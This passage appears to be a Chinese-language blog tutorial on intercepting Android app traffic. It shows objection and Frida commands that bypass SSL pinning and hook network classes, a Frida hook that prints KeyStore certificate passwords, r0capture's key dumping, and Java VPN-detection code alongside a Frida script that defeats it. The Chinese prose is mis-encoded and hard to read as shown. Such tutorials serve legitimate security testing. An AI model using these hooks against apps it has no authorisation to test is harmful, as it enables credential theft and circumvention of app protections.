disable</code></p><p>å¦å¤–DroidSSLUnpiningå¼€æºé¡¹ç›®ä¹Ÿå¯ä»¥è¿›è¡Œç»•è¿‡</p><p>åœ¨æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯å¯¹æŠ—æ‰‹æ®µä¸­ï¼Œåœ¨ä¸­é—´äººçš„çŠ¶æ€ä¸‹ä¸æœåŠ¡å™¨é€šä¿¡çš„å®é™…ä¸Šæ˜¯æŠ“åŒ…å·¥å…·ï¼Œæ‰€æœ‰æˆ‘ä»¬å¯ä»¥å°†appä¸­å†…ç½®çš„è¯ä¹¦å¯¼å…¥Charlesä¸­ è®©æœåŠ¡å™¨è®¤ä¸ºè‡ªå·±æ‰”åœ¨æ˜¯ä¸å…¶ä¿¡ä»»çš„å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ï¼Œè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨çš„ä½œç”¨ã€‚</p><p>æˆ–è€… <a href="https://github.com/deathmemory/FridaContainer">GitHub - deathmemory/FridaContainer: FridaContainer æ•´åˆäº†ç½‘ä¸Šæµè¡Œçš„å’Œè‡ªå·±ç¼–å†™çš„å¸¸ç”¨çš„ frida è„šæœ¬ï¼Œä¸ºé€†å‘å·¥ä½œææ•ˆä¹‹ç”¨ã€‚ frida è„šæœ¬æ¨¡å—åŒ–ï¼ŒJava &amp; Jni Traceã€‚</a></p><p><strong>ObjectionUnpinningPlus</strong></p><p><a href="https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js">https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js</a></p><p><a href="https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md">https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md</a></p><ul><li>ä½¿ç”¨æ–¹æ³•1 attach : frida -U com.example.mennomorsink.webviewtest2 â€”no-pause -l hooks.js</li><li>ä½¿ç”¨æ–¹æ³•2 spawn : python <a href="http://application.py">application.py</a> com.example.mennomorsink.webviewtest2</li></ul><h2 id="Hookæ¨¡æ‹ŸæŠ“åŒ…">Hookæ¨¡æ‹ŸæŠ“åŒ…</h2><ul><li>æ‰“å°å†…å­˜ä¸­åŠ è½½çš„ç±» <code>android hooking list classes</code></li><li>é€šè¿‡å…³é”®å­—HTTPURLConnectå’Œokhttp(3)è¿‡æ»¤ç±» <code>cat objection.log |grep -i </code> HTTPURLConnectæˆ–okhttp(3)  æ³¨æ„ï¼šè¿™é‡Œobjection.logæ˜¯ç¬¬ä¸€æ­¥è¾“å‡ºç±»çš„æ—¥å¿—</li><li>åˆ©ç”¨objectionçš„-cå‚æ•° traceæ‰§è¡Œhookå‘½ä»¤ ï¼Œå…ˆå»ºä¸€ä¸ªæ–‡æœ¬.txtï¼Œé‡Œé¢å†…å®¹æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç±»ä¼¼äº<code>android hooking watch class ç±»å</code>ï¼Œtxtæ–‡æœ¬å»ºç«‹åï¼Œä½¿ç”¨<code>objection -g åŒ…å explore -c xxx.txt</code>å³å¯</li><li>hookåç‚¹å‡»appçš„ç™»å½•çœ‹çœ‹æœ‰æ²¡æœ‰å‡½æ•°è¢«è°ƒç”¨ï¼Œå¦‚æœæœ‰è¿›ä¸€æ­¥åˆ†æ</li><li>è¿™é‡Œé€‰æ‹©ä¸€ä¸ªhookåˆ°çš„å‡½æ•°hookä»–<code>android hooking watch class_method å‡½æ•°å --dump-args --dump-backtrace --dump-return</code> é‡æ–°ç™»å½•ä¸€ä¸‹app</li><li>å‘ç°æ•°æ®åŒ…å‘é€çš„å‡½æ•°ä¸ºAï¼Œ(é€šè¿‡hookä»–è¿›ä¸€æ­¥éªŒè¯çŒœæƒ³)</li></ul><p>ä¸€ä¸ªèƒ½å¤Ÿå®Œæˆæ··æ·†åçš„ okhttpçš„é¡¹ç›®ï¼šokhttpLogger-Frida</p><p>okhttpLogger-Frida:é€šè¿‡åå°„åŒºè·å–æ‰€æœ‰çš„ç±»å¹¶åˆ©ç”¨okhttp3çš„ä¸€äº›æ¡†æ¶ç‰¹å¾å»éªŒè¯appä¸­æ˜¯å¦ä½¿ç”¨äº†okhttp3è¿™ä¸ªç½‘ç»œé€šä¿¡æ¡†æ¶ã€‚</p><p>ä½¿ç”¨æ–¹æ³•</p><ul><li>ä¸‹è½½okhttpfind.dexï¼Œæ¨åˆ°/data/local/tmpç›®å½•</li><li>å¯åŠ¨appå¹¶ä½¿ç”¨å‘½ä»¤å°†okhttp_poker.jsæ³¨å…¥appä¸­<br><code>frida -U -l okhttp_poker.js </code></li><li>æ³¨å…¥åï¼ŒæŒ‰ç…§æç¤ºè¾“å…¥find()å‘½ä»¤ä»¥æ‰§è¡Œå¯»æ‰¾okhttpæ¡†æ¶çš„åŠŸèƒ½ï¼Œå¦‚æœæ‰¾åˆ°ç›¸åº”çš„okhttpç±»ä¾¿ä¼šå°†ç»“æœæ‰“å°å‡ºæ¥</li><li>å°†æ‰¾åˆ°çš„ç»“æœå¤åˆ¶åˆ°okhttp_poker.jsè¦†ç›–æ‰åŸæœ¬okhttp_poker.jsè„šæœ¬ä¸­å…³äºokhttpç±»çš„ä¸€äº›å®šä¹‰</li><li>ç„¶åé‡æ–°æ³¨å…¥è¿™ä¸ªokhttp_poker.jsè„šæœ¬ã€‚æ‰§è¡Œhold()å‘½ä»¤ï¼Œç„¶åä»»æ„ç‚¹å‡»appçš„æŒ‰é’®ï¼Œä¾¿ä¼šå‘ç°ä¸€äº›ç½‘ç»œè¿æ¥çš„å†…å®¹ã€‚æç¤ºï¼šå¦‚æœæƒ³è¦èƒ½å¤Ÿä¿å­˜ï¼Œåœ¨è¾“å…¥è„šæœ¬æ³¨å…¥å‘½ä»¤æ—¶å€™åŠ ä¸Š-o ä¿å­˜æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿™æ ·å°†ä¸€æ¬¡æ³¨å…¥åçš„æ‰€æœ‰è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚</li></ul><h3 id="å®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯çš„å§¿åŠ¿">å®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯çš„å§¿åŠ¿</h3><p>[<a href="https://bbs.kanxue.com/thread-283483.htm">åŸåˆ›]Android appä¸‰ç§å¸¸è§æŠ“åŒ…åœºæ™¯åŠæ¡ˆä¾‹åˆ†æ-Androidå®‰å…¨-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><ol><li>ä½¿ç”¨objectionè¿›è¡Œå¸¸è§„çš„æŠ“åŒ…hookæ“ä½œ(è§ä¸Š)ï¼Œæˆ–è€…ä½¿ç”¨ objectionçš„ <code>android sslpinning disable</code></li><li>è€ƒè™‘åˆ°appåœ¨éªŒè¯è¯ä¹¦æ—¶ä¸€å®šä¼šæ‰“å¼€è¯ä¹¦æ–‡ä»¶åˆ¤æ–­æ˜¯å¦æ˜¯appä¿¡ä»»çš„æ¡†æ¶ï¼Œæ‰€ä»¥ä¼šä½¿ç”¨Fileç±»çš„æ„é€ å‡½æ•°æ‰“å¼€è¯ä¹¦è·å¾—å¥æŸ„ã€‚æ‰€ä»¥hook Fileç±»çš„æ„é€ å‡½æ•°<br><code>android hooking watch class_method java.io.File.$init --dump-args --dump-return</code><br>ï¼ˆåœ¨linuxç»ˆç«¯$éœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦ï¼Œå³File./$initï¼‰,hookåä»¥/system/etc/security/cacertsè¿™ä¸ªç³»ç»Ÿå­˜æ”¾è¯ä¹¦çš„è·¯å¾„ä¸ºå…³é”®å­—è¿›è¡Œæœç´¢<br>æˆ–è€…å¦‚ä¸‹objectionå‘½ä»¤ï¼š<br><code>objection -N -h 127.0.0.1 -p 26666 -g cn.ticktick.task explore -P ~/.objection/plugins -s &quot;android hooking watch class_method java.io.File.\init --dump-args --dump-backtrace --dump-return</code></li></ol><h3 id="æœåŠ¡ç«¯éªŒè¯å®¢æˆ·ç«¯çš„å§¿åŠ¿">æœåŠ¡ç«¯éªŒè¯å®¢æˆ·ç«¯çš„å§¿åŠ¿</h3><p>æŠ“åŒ…å‡ºç°**â€œ400 No required SSL certificate was sentâ€**å³å‡ºç°æœåŠ¡ç«¯æ ¡éªŒå®¢æˆ·ç«¯ã€‚</p><p>æŠ“åŒ…å·¥å…·ä¸­å¯¼å…¥appçš„è¯ä¹¦</p><p>å°†apkè§£åŒ…ï¼Œæœç´¢è¯ä¹¦<code>tree NCfhl |grep -i p12 </code></p><p>ç³»ç»ŸåŠ è½½è¯ä¹¦æ–‡ä»¶çš„æ–¹å¼â€“ä½¿ç”¨keystore.loadå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯ä¹¦è¾“å…¥æµï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯†ç ã€‚å¯¹ç€è¿›è¡Œhookå³å¯æ‰“å°è¯ä¹¦å’Œå…¶å¯†ç (ä»£ç å®ç°å…·ä½“è§ã€ŠæŠ“åŒ…å®æˆ˜ã€‹ä¹¦ç±246é¡µ)ã€‚æˆ–è€…å¦‚ä¸‹</p><p><img src="/posts/be4930f3.htm/image-20240704222928657.png" alt="image-20240704222928657"></p><p>æˆ–è€…ä½¿ç”¨å¦‚ä¸‹è„šæœ¬æ‰“å°å¯†ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;KeyStore.load1&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>, <span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;KeyStore.load2&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æˆ–è€…ä½¿ç”¨r0capture</strong></p><p>å¯¹äºä½¿ç”¨r0captureçš„åŸç†ï¼š</p><p>åœ¨å®‰å“å¼€å‘ä¸­ï¼Œç³»ç»ŸåŒ…æ˜¯æ— æ³•æ··æ·†çš„ï¼Œä¾‹å¦‚java.security.KeyStoreä¸ä¼šè¢«æ··æ·†ï¼Œæ‰€ä»¥å¯ä»¥hookè¿™ä¸ªç±»æ¥è·å¾—è¯ä¹¦ï¼Œå¹¶ä¸”åœ¨javaä¸­ï¼ŒKeyStore$PrivateKeyEntryæ˜¯å­˜å‚¨åœ¨KeyStoreä¸­çš„ï¼ŒåŒ…å«ç§é’¥å’Œç›¸å…³è¯ä¹¦ï¼Œå³getPrivateKey() å’Œ getCertificateChain() è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´å½“åº”ç”¨ç¨‹åºè°ƒç”¨getPrivateKey() å’Œ getCertificateChain() æ–¹æ³•æ¥è·å¾—ç§é’¥å’Œè¯ä¹¦çš„æ—¶å€™ï¼Œä¼šè¢«è„šæœ¬æ‹¦æˆªæå–è¿”å›çš„ç§é’¥å’Œè¯ä¹¦æ•°æ®ï¼Œç„¶åstoreP12()å‡½æ•°ï¼Œå°†æå–å‡ºæ¥çš„ç§é’¥å’Œè¯ä¹¦ç»„åˆèµ·æ¥ï¼Œå­˜å‚¨ä¸ºä¸€ä¸ª.p12æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨å¯†ç r0ysueè¿›è¡ŒåŠ å¯†å†™å…¥æŒ‡å®šæ–‡ä»¶ä¸­ã€‚</p><h2 id="r0capture">r0capture</h2><p>å…·ä½“ä½¿ç”¨è§githubå®˜æ–¹æ–‡æ¡£</p><p>å¦‚æœr0captureè·‘ä¸èµ·æ¥ï¼š</p><ul><li>attchåŠ è½½py</li><li>fridaè·‘script.js</li><li>-w 3 ç­‰å¾…å‡ ç§’</li></ul><p>å®ç°ä¸»è¦æ˜¯ä»hookåº•å±‚å‡½æ•°å‡ºå‘</p><p><strong>TCP/SocketæŠ“åŒ…</strong></p><p>java.net.SocketOutputStream.socketWrite0å’Œjava.net.SocketInputStream.socketRead0</p><p><img src="/posts/be4930f3.htm/image-20240701202339677.png" alt="image-20240701202339677"></p><p><strong>SSL/soæŠ“åŒ…</strong></p><p>å¯¹äºNativeå±‚æ”¶å‘åŒ…å‡½æ•°çš„hookå’Œå­˜å‚¨ ä¹Ÿå°±æ˜¯SSLåº“ä¸­çš„ï¼ŒSSL_readå’ŒSSL_writeçš„æ”¶å‘å†…å®¹</p><p><img src="/posts/be4930f3.htm/image-20240701202326570.png" alt="image-20240701202326570"></p><p><strong>å®¢æˆ·ç«¯è¯ä¹¦</strong></p><p>åœ¨æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯çš„æƒ…å†µä¸‹ å¸®åŠ©dumpå®¢æˆ·ç«¯è¯ä¹¦å¹¶ä¿å­˜ä¸ºp12æ ¼å¼ å¯†ç ä¸ºrysue</p><p><img src="/posts/be4930f3.htm/image-20240701202136809.png" alt="image-20240701202136809"></p><p><strong>è¯ä¹¦å®šä½</strong>ã€</p><p>æ‰€æœ‰SSL piningéƒ½å¿…å®šæ‰“å¼€æ–‡ä»¶è®¡ç®—å“ˆå¸Œ</p><p>hookæ‰€æœ‰æ–‡ä»¶æ‰“å¼€æ“ä½œ ä»è°ƒç”¨æ ˆå®šä½æ··æ·†ä½ç½®</p><p><img src="/posts/be4930f3.htm/image-20240701202237286.png" alt="image-20240701202237286"></p><h2 id="ä¸èµ°ä»£ç†çš„æ£€æµ‹">ä¸èµ°ä»£ç†çš„æ£€æµ‹</h2><p>åœ¨HttpURLConnectionå’Œokhttpæ¡†æ¶ä¸­å¯ä»¥æŒ‡å®šä¸èµ°ä»£ç†ã€‚</p><p>åœ¨HttpURLConnectionä¸­æ·»åŠ openConnection(Proxy.NO_PROXT)</p><p><img src="/posts/be4930f3.htm/image-20240703123900637.png" alt="image-20240703123900637"></p><p>åœ¨okhttpæ¡†æ¶ä¸­æ·»åŠ .proxy(Proxy.NO_PROXY)</p><p><img src="/posts/be4930f3.htm/image-20240703124030288.png" alt="image-20240703124030288"></p><p>é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯ä»¥è®¾ç½®ä»£ç†</p><p><img src="/posts/be4930f3.htm/image-20240703125011490.png" alt="image-20240703125011490"></p><p><strong>VPNæ£€æµ‹</strong></p><p>VPNæ£€æµ‹æ˜¯æŒ‡åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿæ£€æŸ¥ç”¨æˆ·æ˜¯å¦æ­£åœ¨ä½¿ç”¨è™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼ˆVirtual Private Network, VPNï¼‰çš„ä¸€ç§æŠ€æœ¯ã€‚å½“ç”¨æˆ·ä½¿ç”¨VPNæ—¶ï¼Œä»–ä»¬çš„ç½‘ç»œæµé‡ä¼šè¢«åŠ å¯†å¹¶é€šè¿‡ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨è·¯ç”±ï¼Œè¿™å¯ä»¥éšè—ç”¨æˆ·çš„å®é™…IPåœ°å€å’Œä½ç½®ä¿¡æ¯ï¼ŒåŒæ—¶ä¿æŠ¤æ•°æ®çš„å®‰å…¨æ€§å’Œéšç§ã€‚</p><p><strong>åŸç†</strong></p><p>å½“å®¢æˆ·ç«¯è¿è¡ŒVPNè™šæ‹Ÿéš§é“åè®®æ—¶ï¼Œä¼šåœ¨å½“å‰èŠ‚ç‚¹åˆ›å»ºåŸºäº<code>eth</code>ä¹‹ä¸Šçš„<code>tun0</code>æ¥å£æˆ–<code>ppp0</code>æ¥å£ã€‚è¿™äº›æ¥å£æ˜¯ç”¨äºå»ºç«‹è™šæ‹Ÿç½‘ç»œè¿æ¥çš„ç‰¹æ®Šç½‘ç»œæ¥å£ã€‚</p><p>VPN åè®®å¤§å¤šæ˜¯ä½œç”¨åœ¨ OSI çš„ç¬¬äºŒå±‚å’Œç¬¬ä¸‰å±‚ä¹‹é—´ï¼Œç”±æ­¤å¯è§VPNèƒ½æŠ“åˆ°ä»£ç†æ–¹å¼çš„æ‰€æœ‰çš„åŒ…</p><p>ä»£ç æ£€æµ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">Check_Vpn1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">            <span class="keyword">if</span> (networkInterfaces == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> Collections.list(networkInterfaces).iterator();</span><br><span class="line">            <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">                <span class="type">NetworkInterface</span> <span class="variable">networkInterface</span> <span class="operator">=</span> (NetworkInterface) it.next();</span><br><span class="line">                <span class="keyword">if</span> (networkInterface.isUp() &amp;&amp; !networkInterface.getInterfaceAddresses().isEmpty()) &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;zj595&quot;</span>, <span class="string">&quot;isVpn NetworkInterface Name: &quot;</span> + networkInterface.getName());</span><br><span class="line">                    <span class="keyword">if</span> (Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;tun0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;ppp0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;p2p0&quot;</span>) || Intrinsics.areEqual(networkInterface.getName(), <span class="string">&quot;ccmni0&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            th.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">Check_Vpn2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> z;</span><br><span class="line">        String networkCapabilities;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">systemService</span> <span class="operator">=</span> getApplicationContext().getSystemService(<span class="string">&quot;connectivity&quot;</span>);</span><br><span class="line">            Intrinsics.checkNotNull(systemService, <span class="string">&quot;null cannot be cast to non-null type android.net.ConnectivityManager&quot;</span>);</span><br><span class="line">            <span class="type">ConnectivityManager</span> <span class="variable">connectivityManager</span> <span class="operator">=</span> (ConnectivityManager) systemService;</span><br><span class="line">            <span class="type">NetworkCapabilities</span> <span class="variable">networkCapabilities2</span> <span class="operator">=</span> connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());</span><br><span class="line">            Log.i(<span class="string">&quot;zj595&quot;</span>, <span class="string">&quot;networkCapabilities -&gt; &quot;</span> + networkCapabilities2);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">z2</span> <span class="operator">=</span> networkCapabilities2 != <span class="literal">null</span> &amp;&amp; networkCapabilities2.hasTransport(<span class="number">4</span>);</span><br><span class="line">            <span class="comment">// æ£€æŸ¥ç½‘ç»œèƒ½åŠ›æ˜¯å¦åŒ…å« &quot;WIFI|VPN&quot; </span></span><br><span class="line">            <span class="keyword">if</span> (networkCapabilities2 != <span class="literal">null</span> &amp;&amp; (networkCapabilities = networkCapabilities2.toString()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (StringsKt.contains$<span class="keyword">default</span>((CharSequence) networkCapabilities, (CharSequence) <span class="string">&quot;WIFI|VPN&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, (Object) <span class="literal">null</span>)) &#123;</span><br><span class="line">                    z = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">return</span> !z || z2;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            z = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (z) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>anti</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hook_vpn</span><span class="params">()</span> &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">NetworkInterface</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.net.NetworkInterface&quot;</span>);</span><br><span class="line">        NetworkInterface.getName.implementation = function () &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">name</span> <span class="operator">=</span> <span class="built_in">this</span>.getName();  <span class="comment">//hook javaå±‚çš„getNameæ–¹æ³•</span></span><br><span class="line">            console.log(<span class="string">&quot;name: &quot;</span> + name);</span><br><span class="line">            <span class="keyword">if</span> (name === <span class="string">&quot;tun0&quot;</span> || name === <span class="string">&quot;ppp0&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;rmnet_data0&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">NetworkCapabilities</span> <span class="operator">=</span> Java.use(<span class="string">&quot;android.net.NetworkCapabilities&quot;</span>);</span><br><span class="line">        NetworkCapabilities.hasTransport.implementation = function () &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        NetworkCapabilities.appendStringRepresentationOfBitMaskToStringBuilder.implementation = function (sb, bitMask, nameFetcher, separator) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bitMask == <span class="number">18</span>) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;bitMask&quot;</span>, bitMask);</span><br><span class="line">                sb.append(<span class="string">&quot;WIFI&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                console.log(sb, bitMask);</span><br><span class="line">                <span class="built_in">this</span>.appendStringRepresentationOfBitMaskToStringBuilder(sb, bitMask, nameFetcher, separator);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç§æ£€æµ‹æ¡†æ¶</p><p><img src="/posts/be4930f3.htm/image-20240703131243570.png" alt="image-20240703131243570"></p><p>å½“å¼€å¯vpnæ—¶ï¼ŒgetNameè·å¾—ç½‘ç»œè®¾å¤‡åç§°=<strong>tun0</strong> ä¸»è¦æ£€æµ‹java.net.NetworkInterface.getName</p><p>ç¬¬äºŒç»„æ£€æµ‹<img src="/posts/be4930f3.htm/image-20240709195852130.png" alt="image-20240709195852130"></p><p>å¦‚æœå¼€å¯vpnï¼Œè¾“å‡ºä¼šæœ‰vpnå­—çœ¼</p><p><strong>connectionProxyDictionary</strong></p><p>è®¾ç½® connectionProxyDictionary å˜é‡ï¼Œå¯ä»¥é˜²æ­¢ Burpã€Charles æŠ“åŒ…å·¥å…·æŠ“åŒ… ä»…é™è®¾ç½®ç³»ç»Ÿä»£ç†çš„æ—¶å€™é˜²æ­¢æŠ“åŒ…ï¼Œç¬¬ä¸‰æ–¹ä»£ç†å·¥å…·ä»ç„¶å¯ä»¥æŠ“å¾—åˆ°åŒ…ï¼Œæ¯”å¦‚shadowrocketã€‘</p><p><a href="https://www.jianshu.com/p/1afce4a6bd7e">connectionProxyDictionary ç¬”è®° - ç®€ä¹¦</a></p><p><a href="https://github.com/cherubstar/iOSEnvDetection/blob/d8fe85956c62446a663e69915bc4f1cbfce2d0a0/EnvDetection/EnvDetection/AgentDetection/AgentDetection.m#L94">iOSEnvDetection/EnvDetection/EnvDetection/AgentDetâ€¦</a></p><h2 id="HttpURLConnection">HttpURLConnection</h2><h3 id="åŸºæœ¬æ¡†æ¶">åŸºæœ¬æ¡†æ¶</h3><p>è¿™ç§é€šä¿¡æ¡†æ¶ä¸€èˆ¬åœ¨å­çº¿ç¨‹ä¸­è¿›è¡Œã€‚å…¶ä¸­HttpsRequestå°è£…äº†HttpURLConnectionå®ç°</p><p><img src="/posts/be4930f3.htm/image-20240703124824748.png" alt="image-20240703124824748"></p><p><strong>HttpURLConnectionåŸºæœ¬æ¡†æ¶</strong></p><p><img src="/posts/be4930f3.htm/image-20240703125108363.png" alt="image-20240703125108363"></p><p><img src="/posts/be4930f3.htm/image-20240703130214141.png" alt="image-20240703130214141"></p><p><img src="/posts/be4930f3.htm/image-20240703130315196.png" alt="image-20240703130315196"></p><h3 